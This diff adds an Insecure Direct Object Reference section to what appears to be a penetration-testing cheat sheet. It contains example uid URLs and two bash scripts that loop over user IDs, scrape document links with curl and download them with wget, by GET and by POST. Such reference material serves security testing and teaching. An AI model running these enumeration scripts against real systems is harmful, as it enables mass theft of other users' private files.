@@ -1209,6 +1209,42 @@ Rename the GET/POST request to a HEAD
 #20. - Insecure Direct Object References (IDOR)
 -----------------------------------------
 
+- IDOR Parameters
+
+```
+http://<IP address>/documents.php?uid=1
+http://<IP address>/documents.php?uid=2
+http://<IP address>/documents.php?uid=3
+```
+
+- Mass Enumeration IDOR Parameter
+
+```
+#!/bin/bash
+
+url="http://<IP address>:<port>"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+- Mass Enumeration IDOR Parameter POST Request
+
+```
+#!/bin/bash
+
+url="http://<IP address>:<port>"
+
+for i in {1..20}; do
+        for link in $(curl -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\.\w+"); do
+                wget -q $url/$link
+        done
+done
+```
+
 #21. - XML External Entity (XXE) Injection
 -----------------------------------------
 
